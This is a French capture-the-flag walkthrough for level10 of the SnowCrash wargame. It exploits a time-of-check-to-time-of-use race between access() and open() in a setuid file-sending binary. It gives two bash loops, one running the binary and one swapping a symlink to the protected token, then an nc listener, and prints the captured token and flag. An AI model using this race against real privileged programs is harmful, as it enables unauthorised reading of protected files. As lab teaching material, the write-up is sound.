# Level10

Sur le home de l'utilisateur level10, à l'instar des level08 et level09 nous y trouvons un fichier token et un exécutable portant le nom de l'utilisateur.  
Effectuons des tests :
```sh
level10@SnowCrash:~$ ls
level10  token
level10@SnowCrash:~$ ./level10 token
./level10 file host
	sends file to host if you have access to it
```
L'usage nous indique que l'executable envoi un fichier si nous avons les droits dessus.
avec `strings level10` nous trouvons le port sur lequel le fichier est envoyé, ainsi que le programme utilise `open` et `access`: 
```sh
Connecting to %s:6969 ..
open
access
```
Nous allons utiliser cette faille d'access afin de récupérer le token :  
`Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit, par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec open(2), risque de créer un trou de sécurité.
En effet, l'utilisateur peut exploiter le petit intervalle de temps entre la vérification et l'accès pour modifier le fichier (via un lien symbolique en général).
Pour cette raison, l'utilisation de cet appel système devrait être évitée.` (man access)  

Nous allons utiliser les scripts suivants : 
```bash
#!/bin/bash
while true;
do
	~/level10 /tmp/link 127.0.0.1
done
```
Qui va sans cesse essayer d'envoyer le fichier tmp/link sur le localhost  
et :  
```bash
#!/bin/bash
while true;
do
	rm -f /tmp/link
	touch /tmp/link
	ln -fs ~/token /tmp/link
done
```
Qui lui va supprimer le fichier /tmp/link, le créer et faire un lien symbolique sur le fichier token du home
Il nous reste qu'à écouter les transfert via `nc`  
```bash
level10@SnowCrash:~$ nc -lk 6969
```
l'option l pour l'ecoute et l'option k pour garder la connection.
Nous obtenons le token :  
```bash
.*( )*.
woupa2yuojeeaaed06riuj63c
```
Il nous reste plus qu'à récuperer le flag : 
```bash 
level10@SnowCrash:~$ su flag10
Password:woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
||<h3 align="center"> Documentation </h3>|
|:--------:|:---------:|
|access|http://manpagesfr.free.fr/man/man2/access.2.html|
|nc|https://howto.lintel.in/listen-arbitrary-port-print-data-coming-using-netcat/|
